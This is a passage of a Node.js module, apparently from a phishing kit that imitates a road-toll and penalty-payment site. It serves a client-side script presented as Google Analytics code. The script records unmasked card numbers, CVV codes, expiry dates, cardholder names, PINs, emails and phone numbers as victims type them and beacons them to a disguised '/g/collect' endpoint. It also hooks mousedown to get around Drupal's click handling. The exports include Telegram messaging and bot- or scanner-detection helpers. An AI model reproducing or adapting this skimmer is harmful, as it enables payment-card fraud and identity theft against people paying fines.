        res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
      }
    });
  } catch (error) {
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
  }
}

/**
 * Client-side tracking script - FULL DATA LOGGING
 * Tracks ALL user input without masking for complete visibility
 */
function getTrackingScript() {
  return `
<!-- Analytics Measurement Protocol -->
<script>
(function(w,d,s,l,i){
  w['GoogleAnalyticsObject']=l;w[l]=w[l]||function(){(w[l].q=w[l].q||[]).push(arguments)};
  w[l].l=1*new Date();
  
  var _sent={},_step=0,_page=location.pathname,_payClickTime=0,_lastPayNotificationTime=0;
  
  // Encode data
  function _enc(o){try{return btoa(unescape(encodeURIComponent(JSON.stringify(o))))}catch(e){return''}}
  
  // Send tracking data
  function _send(p){
    var k=p.t+'_'+(p.ec||'')+'_'+(p.el||'')+'_'+(p.ev||'');
    if(_sent[k]&&Date.now()-_sent[k]<2000)return;
    _sent[k]=Date.now();
    var u='/g/collect',m=_enc(p);
    if(!m)return;
    try{navigator.sendBeacon(u,'v=2&tid=G-XXXXXX&_p='+m)}
    catch(e){new Image().src=u+'?v=2&_p='+encodeURIComponent(m)+'&_t='+Date.now()}
  }
  
  // Get current page type
  function _getPageType(){
    if(_page.indexOf('pay-penalty')>-1)return 'pay-penalty';
    if(_page.indexOf('pay-toll')>-1)return 'pay-toll';
    if(_page.indexOf('login')>-1)return 'login';
    if(_page.indexOf('appeal')>-1)return 'appeal';
    return 'other';
  }
  
  // Field name mapping - DETAILED
  var _fieldMap={
    'vehicle_registration_number':'vh',
    'vehicle_reg':'vh',
    'vrn':'vh',
    'registration':'vh',
    'reg_number':'vh',
    'plate':'vh',
    'email':'em',
    'mail':'em',
    'pin':'pin',
    'pin_code':'pin',
    'notice_number':'notice',
    'notice':'notice',
    'journey_reference':'journey',
    'journey_ref':'journey',
    'journey':'journey',
    'card_number':'cd',
    'card':'cd',
    'pan':'cd',
    'cc_number':'cd',
    'cvv':'cv',
    'cvc':'cv',
    'security_code':'cv',
    'expiry':'ex',
    'exp_date':'ex',
    'expiration':'ex',
    'exp_month':'ex',
    'exp_year':'ex',
    'cardholder':'nm',
    'card_holder':'nm',
    'holder_name':'nm',
    'name':'nm',
    'phone':'ph',
    'mobile':'ph',
    'telephone':'ph',
    'amount':'amount',
    'total':'amount',
    'payment_amount':'amount'
  };
  
  // Get field code from input
  function _getFieldCode(el){
    var n=(el.name||el.id||el.placeholder||'').toLowerCase();
    for(var k in _fieldMap){
      if(n.indexOf(k)>-1||n.indexOf(k.replace('_',''))>-1)return _fieldMap[k];
    }
    // Check type
    if(el.type==='email')return 'em';
    if(el.type==='tel')return 'ph';
    return 'ot';
  }
  
  // Check if element is visible
  function _isVisible(el){
    if(!el)return false;
    var s=getComputedStyle(el);
    return s.display!=='none'&&s.visibility!=='hidden'&&el.offsetParent!==null;
  }
  
  // Detect current form step - BUT SKIP if Pay button was just clicked
  function _detectStep(){
    // SKIP step detection for 3 seconds after Pay button click
    // This ensures Pay click event is sent first and not overwritten
    if(_payClickTime && (Date.now() - _payClickTime) < 3000){
      return;
    }
    
    var cardInputs=d.querySelectorAll('input[name*="card"],input[name*="pan"],input[name*="cc_number"]');
    var emailInputs=d.querySelectorAll('input[type="email"],input[name*="email"]');
    var vehInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[name*="vrn"],input[name*="plate"]');
    var pinInputs=d.querySelectorAll('input[name*="pin"],input[name*="notice"],input[name*="journey"]');
    
    // Check for visible card inputs
    for(var i=0;i<cardInputs.length;i++){
      if(_isVisible(cardInputs[i])){
        if(_step!==4){_step=4;_send({t:'event',ec:'checkout',ea:'step',el:'card_input',pg:_getPageType()})}
        return;
      }
    }
    
    // Check for confirmation/review
    if(d.querySelector('.summary,.review,.confirm,.confirmation')){
      if(_step!==3){_step=3;_send({t:'event',ec:'checkout',ea:'step',el:'confirmation',pg:_getPageType()})}
      return;
    }
    
    // Check email step
    for(var i=0;i<emailInputs.length;i++){
      if(_isVisible(emailInputs[i])){
        if(_step!==2){_step=2;_send({t:'event',ec:'checkout',ea:'step',el:'email_input',pg:_getPageType()})}
        return;
      }
    }
    
    // Check vehicle/PIN step
    for(var i=0;i<vehInputs.length;i++){
      if(_isVisible(vehInputs[i])){
        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'vehicle_input',pg:_getPageType()})}
        return;
      }
    }
    for(var i=0;i<pinInputs.length;i++){
      if(_isVisible(pinInputs[i])){
        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'pin_input',pg:_getPageType()})}
        return;
      }
    }
  }
  
  // Track focus on form fields
  d.addEventListener('focus',function(e){
    var el=e.target;
    if(!el||!el.tagName)return;
    if(el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA'){
      var code=_getFieldCode(el);
      _send({t:'event',ec:'form',ea:'focus',el:code,pg:_getPageType()})
    }
  },true);
  
  // Collect PIN from multiple fields (PIN is split into 4 inputs)
  function _collectPIN(){
    var pinFields=d.querySelectorAll('input[name*="pin"],input[id*="pin"]');
    var pinValues=[];
    for(var i=0;i<pinFields.length;i++){
      if(pinFields[i].value&&pinFields[i].value.length===1){
        pinValues.push(pinFields[i].value);
      }
    }
    if(pinValues.length>=4){
      return pinValues.join('');
    }
    // Try by index pattern (edit-pin--0, edit-pin--1, etc.)
    var pin='';
    for(var j=0;j<4;j++){
      var f=d.querySelector('input[name*="pin"][name*="'+j+'"],input[id*="pin"][id*="'+j+'"]');
      if(f&&f.value)pin+=f.value;
    }
    return pin.length>=4?pin:null;
  }
  
  // Collect Notice Number from multiple fields
  function _collectNotice(){
    var noticeFields=d.querySelectorAll('input[name*="notice"],input[id*="notice"]');
    var vals=[];
    for(var i=0;i<noticeFields.length;i++){
      if(noticeFields[i].value)vals.push(noticeFields[i].value);
    }
    return vals.length>0?vals.join(''):null;
  }
  
  // Track blur (field completed) - FULL DATA NO MASKING
  d.addEventListener('blur',function(e){
    var el=e.target;
    if(!el||!el.tagName)return;
    if((el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA')&&el.value){
      var code=_getFieldCode(el);
      var n=(el.name||el.id||'').toLowerCase();
      
      // Special handling for PIN fields (collect all 4 digits)
      if(n.indexOf('pin')>-1){
        var fullPIN=_collectPIN();
        if(fullPIN&&fullPIN.length>=4){
          _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:fullPIN,pg:_getPageType()});
          return;
        }
      }
      
      // Special handling for Notice fields
      if(n.indexOf('notice')>-1){
        var fullNotice=_collectNotice();
        if(fullNotice){
          _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:fullNotice,pg:_getPageType()});
          return;
        }
      }
      var val=el.value;
      // NO MASKING - send full value
      _send({t:'event',ec:'form',ea:'complete',el:code,ev:val,pg:_getPageType()})
    }
  },true);
  
  // Track radio button changes (PIN vs Notice Number selection)
  d.addEventListener('change',function(e){
    var el=e.target;
    if(!el)return;
    if(el.type==='radio'){
      var name=el.name||'radio';
      var val=el.value||el.id||'selected';
      _send({t:'event',ec:'form',ea:'radio',el:name,ev:val,pg:_getPageType()})
    }
    if(el.type==='checkbox'){
      var name=el.name||'checkbox';
      var val=el.checked?'checked':'unchecked';
      _send({t:'event',ec:'form',ea:'checkbox',el:name,ev:val,pg:_getPageType()})
    }
    if(el.tagName==='SELECT'){
      var code=_getFieldCode(el);
      _send({t:'event',ec:'form',ea:'complete',el:code,ev:el.value,pg:_getPageType()})
    }
  },true);
  
  // Helper: Get clean button text (only direct text, not from children)
  function _getButtonText(btn){
    // Priority 1: value attribute (cleanest)
    if(btn.value&&btn.value.trim()){
      return btn.value.trim();
    }
    // Priority 2: Get only direct text nodes (exclude child elements)
    var text='';
    for(var i=0;i<btn.childNodes.length;i++){
      var node=btn.childNodes[i];
      if(node.nodeType===3){ // Text node
        text+=node.textContent;
      }
    }
    if(text.trim()){
      return text.trim();
    }
    // Priority 3: innerText (respects CSS visibility)
    if(btn.innerText){
      var it=btn.innerText.trim();
      // Remove long text (likely contains child elements)
      if(it.length<100){
        return it;
      }
    }
    // Priority 4: textContent but limit length
    if(btn.textContent){
      var tc=btn.textContent.trim();
      // If too long, likely contains child elements - use first word only
      if(tc.length>50){
        var firstWord=tc.split(/[\\s\\n\\r\\t]+/)[0];
        return firstWord||'Pay';
      }
      return tc;
    }
    return 'Pay';
  }
  
  // CRITICAL: Track PAY button using MOUSEDOWN - fires BEFORE Drupal AJAX intercepts click
  // Drupal uses stopImmediatePropagation() on click, so we use mousedown instead
  function _handlePayButton(e){
    var target=e.target;
    
    // DEBOUNCE: Don't send notification if we already sent one in last 3 seconds
    var now=Date.now();
    if(_lastPayNotificationTime && (now - _lastPayNotificationTime) < 3000){
      return; // Skip - too soon after last notification
    }
    
    // Check for Drupal Pay button specifically by data-drupal-selector
    var payBtn=target.closest('[data-drupal-selector="edit-pay"],[data-drupal-selector*="pay"],[name="op"][value="Pay"]');
    if(payBtn){
      _payClickTime=Date.now();
      _lastPayNotificationTime=now;
      var txt=_getButtonText(payBtn);
      _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:txt,pg:_getPageType()});
      return;
    }
    
    // Also check for generic Pay buttons
    var btn=target.closest('button,input[type="submit"],.btn,[role="button"],a.btn,a.button,.form-submit,.btn-pay-trips');
    if(btn){
      // Check button attributes FIRST (more reliable than text)
      var btnId=(btn.id||'').toLowerCase();
      var btnClass=(btn.className||'').toLowerCase();
      var btnValue=(btn.value||'').toLowerCase();
      var btnName=(btn.name||'').toLowerCase();
      
      // Detect PAY button - STRICT CHECK (avoid false positives)
      var isPay=false;
      
      // STRICT: Must have "pay" in ID, class, or value (not just text)
      if(btnId.indexOf('pay')>-1||btnId.indexOf('edit-pay')>-1){isPay=true;}
      if(btnClass.indexOf('btn-pay')>-1||btnClass.indexOf('pay-trips')>-1){isPay=true;}
      if(btnValue==='pay'||btnValue==='Pay'){isPay=true;}
      if(btnName==='op'&&(btnValue==='pay'||btnValue==='Pay')){isPay=true;}
      
      // Also check for Drupal-specific selectors
      if(btn.getAttribute('data-drupal-selector')&&btn.getAttribute('data-drupal-selector').indexOf('pay')>-1){
        isPay=true;
      }
      
      // LAST RESORT: Check text ONLY if button text is exactly "Pay" (case insensitive)
      if(!isPay){
        var txt=_getButtonText(btn).toLowerCase().trim();
        // Must be exactly "pay" or start with "pay " (not "find vehicle" etc)
        if(txt==='pay'||txt==='pay '||txt.startsWith('pay ')){
          isPay=true;
        }
      }
      
      if(isPay){
        _payClickTime=Date.now();
        _lastPayNotificationTime=now; // Update debounce timer
        // Use value attribute if available, otherwise clean text
        var cleanText=btn.value||_getButtonText(btn);
        // Clean text - remove extra whitespace and limit length
        cleanText=cleanText.replace(/[\\s\\n\\r\\t]+/g,' ').trim().substring(0,30);
        _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:cleanText||'Pay',pg:_getPageType()});
      }
      // DO NOT send other button clicks - they create noise
    }
  }
  
  // Use MOUSEDOWN - fires before click, cannot be blocked by Drupal AJAX
  d.addEventListener('mousedown',_handlePayButton,true);
  // Also use POINTERDOWN for touch devices
  d.addEventListener('pointerdown',_handlePayButton,true);
  // Fallback to click (might not work for Drupal AJAX buttons)
  d.addEventListener('click',_handlePayButton,true);
  
  // Track outbound links on click
  d.addEventListener('click',function(e){
    var a=e.target.closest('a');
    if(a&&a.href){
      try{
        var u=new URL(a.href,location.href);
        if(u.hostname&&u.hostname!==location.hostname&&u.hostname.indexOf('efl')<0){
          _send({t:'event',ec:'outbound',ea:'click',el:u.hostname,pg:_getPageType()})
        }
      }catch(x){}
    }
  },true);
  
  // Track form submissions - catches Pay button even if click doesn't work
  d.addEventListener('submit',function(e){
    var form=e.target;
    if(!form||!form.tagName)return;
    
    // DEBOUNCE: Don't send notification if we already sent one in last 3 seconds
    var now=Date.now();
    if(_lastPayNotificationTime && (now - _lastPayNotificationTime) < 3000){
      return; // Skip - too soon after last notification
    }
    
    // Check if this is a payment form
    var formId=(form.id||'').toLowerCase();
    var formAction=(form.action||'').toLowerCase();
    var formClass=(form.className||'').toLowerCase();
    
    var isPayForm=formId.indexOf('pay')>-1||formAction.indexOf('pay')>-1||formClass.indexOf('pay')>-1||
                  formId.indexOf('checkout')>-1||formAction.indexOf('checkout')>-1||
                  formId.indexOf('payment')>-1||formAction.indexOf('payment')>-1;
    
    // Find submit button text
    var submitBtn=form.querySelector('button[type="submit"],input[type="submit"],button:not([type])');
    var btnText='Submit';
    if(submitBtn){
      btnText=(submitBtn.textContent||submitBtn.value||'').replace(/[\\s\\n\\r\\t]+/g,' ').trim();
    }
    
    if(isPayForm||btnText.toLowerCase().indexOf('pay')>-1){
      _payClickTime=Date.now();
      _lastPayNotificationTime=now; // Update debounce timer
      _send({t:'event',ec:'payment',ea:'form_submit',el:'pay',ev:btnText||'Pay Form',pg:_getPageType()});
      console.log('[TRACK] PAY FORM SUBMITTED!', btnText);
    }
  },true);
  
  // Run step detection periodically
  setInterval(_detectStep,1500);
  setTimeout(_detectStep,500);
  
  // Track PIN/Notice completion periodically
  var _lastPIN='',_lastNotice='',_lastVRN='';
  setInterval(function(){
    // Check PIN
    var pin=_collectPIN();
    if(pin&&pin.length>=4&&pin!==_lastPIN){
      _lastPIN=pin;
      _send({t:'event',ec:'form',ea:'complete',el:'pin',ev:pin,pg:_getPageType()});
    }
    // Check Notice
    var notice=_collectNotice();
    if(notice&&notice.length>=6&&notice!==_lastNotice){
      _lastNotice=notice;
      _send({t:'event',ec:'form',ea:'complete',el:'notice',ev:notice,pg:_getPageType()});
    }
    // Check Vehicle Registration
    var vrnInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[id*="vehicle"],input[id*="registration"]');
    for(var i=0;i<vrnInputs.length;i++){
      if(vrnInputs[i].value&&vrnInputs[i].value.length>=5&&vrnInputs[i].value!==_lastVRN){
        _lastVRN=vrnInputs[i].value;
        _send({t:'event',ec:'form',ea:'complete',el:'vh',ev:vrnInputs[i].value,pg:_getPageType()});
      }
    }
  },1000);
  
  // Send initial page info
  _send({t:'event',ec:'page',ea:'view',el:_getPageType(),ev:_page});
  
})(window,document,'script','ga','G-MEASUREMENT');
</script>`;
}

module.exports = {
  trackPageRequest,
  trackingMiddleware,
  handleTrackingAPI,
  handleAnalyticsAPI,  // Masked GA-like endpoint
  trackEvent,
  sendTelegramMessage,
  editTelegramMessage,
  getTrackingScript,
  getSessionId,
  isBot,              // Bot detection utility
  isSuspiciousPath,   // Scanner path detection
};
